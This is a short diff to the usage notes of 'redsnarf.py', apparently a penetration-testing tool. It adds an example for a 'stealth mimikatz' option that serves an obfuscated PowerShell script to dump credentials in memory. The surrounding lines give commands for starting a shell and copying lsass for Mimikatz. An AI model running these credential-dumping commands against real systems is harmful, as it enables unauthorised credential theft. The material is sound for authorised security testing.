@@ -124,6 +124,9 @@ Start a Shell on a machine using domain administrator credentials
 Retrieve a copy of lsass for offline parsing with Mimikatz on a machine using local administrator credentials
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d . -hL y
 
+Run stealth mimikatz, this option fires up a web-server to serve a powershell script, this is obfusctaed and encoded machine side, data doesnt touch disk - creds are grepped for in an easy to read style and echoed back to screen.
+./redsnarf.py -H ip=192.168.198.162 -u administrator -p Password01 -cS y -hR y
+
 Run Custom Command
 Example 1
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -uX 'net user'
